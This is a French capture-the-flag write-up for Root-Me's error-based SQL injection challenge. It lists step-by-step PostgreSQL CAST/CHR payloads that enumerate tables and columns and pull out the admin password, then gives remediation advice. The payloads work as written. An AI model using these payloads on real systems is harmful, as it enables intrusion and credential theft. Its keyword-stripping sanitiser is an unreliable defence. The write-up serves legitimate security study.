# Root-Me – Challenge 7 : SQL Injection - Error Based

## 1. Nom du challenge & URL

**Nom** : Challenge 7 – SQL Injection - Error Based

**URL** : [Root-Me Challenge 7](https://www.root-me.org/fr/Challenges/Web-Serveur/SQL-injection-Error)

---

## 2. Objectif

Le but du challenge est d'exploiter une **SQL Injection basée sur les erreurs** pour extraire des informations sensibles de la base de données PostgreSQL, notamment les credentials de l'utilisateur administrateur.

**Type d'injection** : Error-Based SQL Injection

---

## 3. Étapes de découverte de la vulnérabilité

1. En arrivant sur la page du challenge, on découvre un formulaire de login standard avec deux champs : **username** et **password**.

2. On commence par tester des injections SQL simples pour identifier la vulnérabilité :

   ```
   username: admin' OR '1'='1
   password: test
   ```

3. La page retourne une erreur SQL, ce qui confirme la présence d'une **SQL Injection** et indique que l'application utilise **PostgreSQL** :

   ```
   ERROR: unterminated quoted string at or near "'admin'' OR '1'='1'"
   ```

4. Cette erreur révèle que :
   * L'application est vulnérable aux injections SQL
   * La base de données est **PostgreSQL** (syntaxe des erreurs)
   * Les erreurs SQL sont affichées directement à l'utilisateur

5. On peut exploiter cette vulnérabilité en utilisant la technique **CAST** pour forcer PostgreSQL à afficher des données dans les messages d'erreur.

---

## 4. Exploitation de la vulnérabilité

### 4.1. Découverte des tables

Pour lister les tables de la base de données, on utilise la requête suivante dans le champ **username** :

```sql
admin',(CAST(CHR(62)||(SELECT tablename from pg_tables LIMIT 1 OFFSET 0) AS NUMERIC))-- 
```

**Explication** :
* `CHR(62)` : Génère le caractère `>` pour marquer le début des données extraites
* `pg_tables` : Table système PostgreSQL contenant la liste de toutes les tables
* `LIMIT 1 OFFSET k` : Permet d'extraire les tables une par une en incrémentant `k`
* `CAST(...AS NUMERIC)` : Force une conversion vers un type numérique, ce qui génère une erreur contenant la valeur de la chaîne

En incrémentant l'OFFSET, on découvre plusieurs tables, dont une table suspecte :

```
>m3mbr35t4bl3
```

### 4.2. Comptage des enregistrements

Pour vérifier combien d'utilisateurs existent dans la table :

```sql
admin',(CAST(CHR(62)||(SELECT COUNT(1) FROM m3mbr35t4bl3) AS NUMERIC))-- 
```

Résultat : `>1` (il y a un seul utilisateur)

### 4.3. Découverte de la structure de la table

Pour identifier les colonnes de la table `m3mbr35t4bl3`, on utilise la technique **GROUP BY** progressive :

```sql
admin',(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY 1) AS NUMERIC))-- 
```

PostgreSQL retourne une erreur indiquant le nom de la première colonne :

```
ERROR: column "m3mbr35t4bl3.id" must appear in the GROUP BY clause
```

On continue en ajoutant les colonnes découvertes une par une :

```sql
admin',(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY us3rn4m3_c0l) AS NUMERIC))-- 
admin',(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY us3rn4m3_c0l, id) AS NUMERIC))-- 
admin',(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY us3rn4m3_c0l, id, p455w0rd_c0l) AS NUMERIC))-- 
admin',(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY us3rn4m3_c0l, id, p455w0rd_c0l, em41l_c0l) AS NUMERIC))-- 
```

**Colonnes découvertes** :
* `id`
* `us3rn4m3_c0l`
* `p455w0rd_c0l`
* `em41l_c0l`

### 4.4. Extraction des données

Maintenant qu'on connaît la structure de la table, on peut extraire les données :

#### Extraction de l'ID :

```sql
admin',(CAST(CHR(62)||(SELECT id FROM m3mbr35t4bl3) AS NUMERIC))-- 
```

Résultat : `>1`

#### Extraction de l'email :

```sql
admin',(CAST(CHR(62)||(SELECT em41l_c0l FROM m3mbr35t4bl3) AS NUMERIC))-- 
```

Résultat : `>admin@chalng.com`

#### Extraction du username :

```sql
admin',(CAST(CHR(62)||(SELECT us3rn4m3_c0l FROM m3mbr35t4bl3) AS NUMERIC))-- 
```

Résultat : `>admin`

#### Extraction du password :

```sql
admin',(CAST(CHR(62)||(SELECT p455w0rd_c0l FROM m3mbr35t4bl3) AS NUMERIC))-- 
```

Résultat : `>1a2BdKT5DIx3qxQN3UaC`

---

## 5. Payload final utilisé

Voici la séquence complète des payloads utilisés pour extraire les informations :

```sql
# 1. Découverte des tables
admin',(CAST(CHR(62)||(SELECT tablename from pg_tables LIMIT 1 OFFSET k) AS NUMERIC))-- 

# 2. Comptage des enregistrements
admin',(CAST(CHR(62)||(SELECT COUNT(1) FROM m3mbr35t4bl3) AS NUMERIC))-- 

# 3. Découverte de la structure (colonnes)
admin',(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY 1) AS NUMERIC))-- 
admin',(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY us3rn4m3_c0l) AS NUMERIC))-- 
admin',(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY us3rn4m3_c0l, id) AS NUMERIC))-- 
admin',(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY us3rn4m3_c0l, id, p455w0rd_c0l) AS NUMERIC))-- 
admin',(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY us3rn4m3_c0l, id, p455w0rd_c0l, em41l_c0l) AS NUMERIC))-- 

# 4. Extraction des données
admin',(CAST(CHR(62)||(SELECT id FROM m3mbr35t4bl3) AS NUMERIC))-- 
admin',(CAST(CHR(62)||(SELECT em41l_c0l FROM m3mbr35t4bl3) AS NUMERIC))-- 
admin',(CAST(CHR(62)||(SELECT us3rn4m3_c0l FROM m3mbr35t4bl3) AS NUMERIC))-- 
admin',(CAST(CHR(62)||(SELECT p455w0rd_c0l FROM m3mbr35t4bl3) AS NUMERIC))-- 
```

### Explication technique du payload :

* **`CAST(...AS NUMERIC)`** : Force PostgreSQL à convertir une chaîne en nombre, ce qui échoue et génère une erreur contenant la valeur de la chaîne
* **`CHR(62)`** : Génère le caractère `>` pour faciliter l'identification des données extraites dans les messages d'erreur
* **`||`** : Opérateur de concaténation de chaînes en PostgreSQL
* **`--`** : Commentaire SQL pour ignorer le reste de la requête originale

---

## 6. Résultat obtenu

Après l'extraction complète, on obtient les credentials suivants :

**Username** : `admin`

**Password** : `1a2BdKT5DIx3qxQN3UaC`

On peut maintenant se connecter avec ces credentials pour valider le challenge.

**Le password est le flag** : `1a2BdKT5DIx3qxQN3UaC`

Le challenge est validé !

![challenge7 resultat](images/challenge7.1.png)

---

## 7. Screenshot

Voici un screenshot prouvant que le challenge est terminé :

![challenge7 termine](images/challenge7.png)

---

## 8. Recommandations pour sécuriser la vulnérabilité

Pour corriger cette vulnérabilité de SQL Injection basée sur les erreurs, il faut implémenter les mesures suivantes :

### 8.1. Utiliser des requêtes préparées (Prepared Statements)

Les requêtes préparées avec des paramètres liés empêchent complètement les injections SQL [1] [2] :

**Code vulnérable** :

```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
cursor.execute(query)
```

**Code sécurisé** :

```python
query = "SELECT * FROM users WHERE username = %s AND password = %s"
cursor.execute(query, (username, password))
```

### 8.2. Désactiver l'affichage des erreurs en production

Ne jamais afficher les messages d'erreur SQL détaillés aux utilisateurs [2] [3] :

```python
# Configuration Flask
app.config['DEBUG'] = False
app.config['PROPAGATE_EXCEPTIONS'] = False

# Gestion d'erreur personnalisée
@app.errorhandler(Exception)
def handle_error(error):
    # Logger l'erreur pour les développeurs
    app.logger.error(f"Database error: {error}")
    
    # Retourner un message générique à l'utilisateur
    return "Une erreur s'est produite. Veuillez réessayer.", 500
```

### 8.3. Utiliser un ORM (Object-Relational Mapping)

Les ORM comme SQLAlchemy paramètrent automatiquement les requêtes [3] [4] :

```python
from flask_sqlalchemy import SQLAlchemy

db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(120), nullable=False)

# Requête sécurisée avec ORM
user = User.query.filter_by(username=username, password=password).first()
```

### 8.4. Valider et filtrer les entrées utilisateur

Implémenter une validation stricte des entrées [1] [2] :

```python
import re

def is_valid_username(username):
    # Autoriser uniquement les caractères alphanumériques et underscore
    return re.match(r'^[a-zA-Z0-9_]{3,20}$', username) is not None

def sanitize_input(user_input):
    # Supprimer les caractères dangereux
    dangerous_chars = ["'", '"', ';', '--', '/*', '*/', 'xp_', 'sp_', 'UNION', 'SELECT', 'DROP']
    
    for char in dangerous_chars:
        user_input = user_input.replace(char, '')
    
    return user_input

# Utilisation
if not is_valid_username(username):
    return "Username invalide", 400
```

### 8.5. Principe du moindre privilège

Limiter les permissions du compte de base de données [4] [5] :

```sql
-- Créer un utilisateur avec permissions limitées
CREATE USER webapp_user WITH PASSWORD 'secure_password';

-- Donner uniquement les permissions nécessaires
GRANT SELECT, INSERT, UPDATE ON users TO webapp_user;

-- Ne pas donner accès aux tables système
REVOKE SELECT ON pg_tables FROM webapp_user;
REVOKE SELECT ON information_schema.tables FROM webapp_user;
```

### 8.6. Hacher les mots de passe

Ne jamais stocker les mots de passe en clair [3] [5] :

```python
from werkzeug.security import generate_password_hash, check_password_hash

# Lors de l'inscription
hashed_password = generate_password_hash(password, method='pbkdf2:sha256', salt_length=16)

# Lors de la connexion
user = User.query.filter_by(username=username).first()
if user and check_password_hash(user.password_hash, password):
    # Authentification réussie
    login_user(user)
```

### 8.7. Implémenter une protection contre les attaques par force brute

Limiter le nombre de tentatives de connexion [2] [5] :

```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    # Code de connexion
    pass
```

### 8.8. Utiliser un WAF (Web Application Firewall)

Déployer un WAF pour détecter et bloquer les tentatives d'injection SQL [4] [5] :

```nginx
# Configuration ModSecurity (exemple)
SecRule ARGS "@detectSQLi" \
    "id:1000,\
    phase:2,\
    block,\
    log,\
    msg:'SQL Injection Attack Detected'"
```

### 8.9. Effectuer des audits de sécurité réguliers

Utiliser des outils d'analyse de vulnérabilités [1] [2] :

```bash
# SQLMap - Test automatisé d'injection SQL
sqlmap -u "http://example.com/login" --data="username=admin&password=test" --batch

# OWASP ZAP - Scanner de sécurité web
zap-cli quick-scan -s all http://example.com
```

---

## 9. Références

[1] [OWASP – SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) - Guide complet sur les injections SQL et leur prévention

[2] [OWASP – SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) - Bonnes pratiques pour prévenir les injections SQL

[3] [PostgreSQL Documentation - pg_tables](https://www.postgresql.org/docs/current/view-pg-tables.html) - Documentation sur la vue système pg_tables

[4] [CAST Function in PostgreSQL](https://www.postgresql.org/docs/current/sql-expressions.html#SQL-SYNTAX-TYPE-CASTS) - Documentation sur la fonction CAST utilisée dans cette exploitation